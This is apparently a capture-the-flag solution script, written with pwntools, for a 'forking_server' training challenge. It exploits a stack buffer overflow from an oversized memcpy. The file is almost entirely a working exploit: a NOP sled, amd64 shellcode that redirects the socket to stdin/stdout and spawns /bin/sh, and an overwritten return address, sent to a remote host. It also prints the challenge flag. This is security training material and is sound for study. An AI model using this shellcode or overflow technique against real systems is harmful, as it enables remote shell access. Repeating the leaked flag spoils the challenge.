#FLAG: flag{congratz_you_exploited_a_f0rk_server!_this_is_new_because_I_leaked_this_once}
# SOLUTION: buffer overflow + redirection of stdin/out to socket (already opened)
# vulnerability: during the executino of the program the memcpy function copies 0x1000 bytes over the stack, overwirting
# also the address used by the ret function to return to the main

from pwn import *
from socket import *

context.arch = "amd64"

COMMANDS = """
b *0x401632
c
"""

#c = gdb.debug("./forking_server", gdbscript=COMMANDS)

c=remote("forking-server.training.offensivedefensive.it", 8080, ssl=True)

#s = socket(AF_INET, SOCK_STREAM)
#s.connect(("forking-server.training.offensivedefensive.it", 8080))

# 955 + shellcode --> in order to write (in the location used by the ret function)
# the address of the buffer in which we have this same code
nop_s = b"\x90"*955

# the first part of the code redirect the stdin and stdout to the socket (the fd of the socket is already in the correct
# register)
shellcode= """
mov rax, 0x21
mov rsi, 1
syscall

mov rax, 0x21
mov rsi, 0
syscall

mov rdx,0x0068732f6e69622f
push rdx
mov rdi,rsp
mov rax,0x3b
xor rsi,rsi
xor rdx,rdx
syscall
"""

addr = b"\x00\x41\x40\x00\x00\x00\x00\x00"

shellcode_c = asm(shellcode)
c.send(nop_s+shellcode_c+addr)

c.interactive()
